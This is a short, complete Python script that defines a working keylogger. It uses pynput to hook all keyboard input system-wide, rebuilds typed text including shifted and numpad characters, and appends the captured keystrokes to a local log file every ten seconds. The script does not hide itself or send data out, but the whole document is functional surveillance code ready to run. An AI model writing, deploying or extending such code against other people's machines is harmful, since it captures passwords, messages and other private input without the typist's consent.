from pynput import keyboard
import time
import threading

class KeyLogger:
    def __init__(self):
        self.logged_keys = []
        self.log_file_path = "keystroke_log.txt"
        self.running = True
        self.shift_pressed = False

    def on_press(self, key):
        """Callback function when a key is pressed"""
        try:
            if key == keyboard.Key.shift or key == keyboard.Key.shift_r or key == keyboard.Key.shift_l:
                self.shift_pressed = True
            elif hasattr(key, 'char'):
                if self.shift_pressed:
                    self.logged_keys.append(key.char.upper())  # Log uppercase character
                else:
                    self.logged_keys.append(key.char)
            else:
                if key == keyboard.Key.space:
                    self.logged_keys.append(' ')
                elif key == keyboard.Key.enter:
                    self.logged_keys.append('\n')
                elif key == keyboard.Key.tab:
                    self.logged_keys.append('\t')
                elif key == keyboard.Key.backspace:
                    if self.logged_keys:
                        self.logged_keys.pop()
                elif key in (keyboard.Key.num_lock, keyboard.Key.insert, keyboard.Key.delete):
                    pass  # Ignore num lock and other non-character keys
                elif hasattr(key, 'vk') and 96 <= key.vk <= 105:  # Numpad keys
                    self.logged_keys.append(str(key.vk - 96))  # Log numpad numbers
                else:
                    # Do not log special keys like shift
                    pass

        except Exception as e:
            print(f"Error processing key: {e}")

    def on_release(self, key):
        """Callback function when a key is released"""
        if key == keyboard.Key.shift or key == keyboard.Key.shift_r or key == keyboard.Key.shift_l:
            self.shift_pressed = False

    def save_logged_keys(self):
        """Save the logged keys to the file periodically"""
        while self.running:
            time.sleep(10)  # Save every 10 seconds
            if self.logged_keys:
                with open(self.log_file_path, "a") as log_file:
                    log_file.write(f"{''.join(self.logged_keys)}\n")
                print("Logged keys saved.")
                self.logged_keys.clear()

    def start_logging(self):
        """Start the key logging process"""
        listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        listener.start()
        save_thread = threading.Thread(target=self.save_logged_keys)
        save_thread.start()
        listener.join()

    def stop_logging(self):
        """Stop the key logging process"""
        self.running = False

if __name__ == "__main__":
    logger = KeyLogger()
    try:
        logger.start_logging()
    except KeyboardInterrupt:
        logger.stop_logging()
        print("Keylogger stopped.")
